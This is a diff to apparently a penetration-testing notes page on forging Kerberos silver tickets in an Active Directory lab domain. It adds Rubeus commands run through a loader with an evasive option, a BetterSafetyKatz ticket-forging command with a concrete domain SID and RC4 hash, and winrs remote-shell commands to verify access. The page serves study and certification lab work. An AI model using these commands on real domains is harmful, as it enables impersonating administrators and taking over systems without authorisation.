@@ -7,9 +7,17 @@ Silver ticket is signed and encrypted by the hash of **service** account which m
 {% code overflow="wrap" %}
 ```powershell
 # With Rubeus - HTTP can be changed to HOST, RPCSS, CIFS, LDAP(DC)
-Rubeus.exe silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:<machine_account> /sid:<sid_of_domain> /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/dcorp-dc /rc4:<machine_account> /sid:<domain_cid> /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
+# Or with full domain
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:<machine_account> /sid:<domain_cid> /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
+
 # Anothery way
 C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:e9bb4c3d1327e29093dfecab8c2676f6 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+
+# Verify with winrs if HTTP
+winrs -r:dcorp-dc cmd
+# Use full domain name if it was given while key inject
+winrs -r:dcorp-dc.dollarcorp.moneycorp.local cmd
 ```
 {% endcode %}
 
